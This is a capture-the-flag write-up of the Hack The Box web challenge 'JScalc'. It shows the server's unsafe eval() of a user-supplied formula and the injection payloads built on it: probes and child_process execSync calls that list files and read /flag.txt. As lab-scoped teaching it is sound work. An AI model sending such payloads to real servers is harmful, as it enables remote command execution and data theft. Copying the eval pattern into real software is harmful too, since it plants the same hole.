---
title: JScalc - Hack The Box
date: 2024-11-16
---

# JScalc

![JScalc - thumbnail](/ctf/hack-the-box/challenges/web/jscalc/thumbnail.png)

## Challenge description

In the mysterious depths of the digital sea, a specialized JavaScript calculator has been crafted by tech-savvy squids.
With multiple arms and complex problem-solving skills, these cephalopod engineers use it for everything from inkjet
trajectory calculations to deep-sea math. Attempt to outsmart it at your own risk! 🦑

## Challenge overview

The challenge presents us with a web application that features a JavaScript calculator. Users can input formulas, which
the application evaluates and returns the result.

### How it works

Clicking the **Calculate** button sends a `POST` request to the `/api/calculate` endpoint, where the following
server-side code processes the formula:

```js
module.exports = {
    calculate(formula) {
        try {
            return eval(`(function() { return ${formula} ;}())`);

        } catch (e) {
            if (e instanceof SyntaxError) {
                return 'Something went wrong!';
            }
        }
    }
}
```

**Key Observations**:

1. The application uses the **`eval`** function to evaluate user-provided input.
2. The formula is executed within a function context, meaning arbitrary JavaScript can potentially be executed.

This reliance on `eval` makes the application vulnerable to **Server-Side JavaScript Injection (SSJI)**, allowing us to
execute arbitrary JavaScript code on the server.

## Exploitation

To confirm SSJI, we inject:

```js
process.platform
```

The response includes the server's platform `linux`, it confirms the vulnerability.

Using **Node.js’s `require` function**, we can execute arbitrary system commands through the `child_process` module. For
instance:

- **List files in the directory**:
    ```js
    require('child_process').execSync('ls').toString()
    ```

- **Retrieve the flag**:
    ```js
    require('child_process').execSync('cat /flag.txt').toString()
    ```

After injecting the payload, the server processes the request, and the response includes the contents of the `flag.txt`
file.

![JScalc - flag](/ctf/hack-the-box/challenges/web/jscalc/exploit.png)

With the fake flag retrieved, we can use the same technique to get the real flag on the HTB server.

![JScalc - pwned](/ctf/hack-the-box/challenges/web/jscalc/pwned.png)

## References

- [MDN Web Docs - eval()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)
- [Node.js - child_process](https://nodejs.org/api/child_process.html)
- [OWADP NodeGoat - Server-Side Injection](https://ckarande.gitbooks.io/owasp-nodegoat-tutorial/content/tutorial/a1_-_server_side_js_injection.html)
- [Github - Code injection](https://github.com/btarr/node-eval-code-injection)
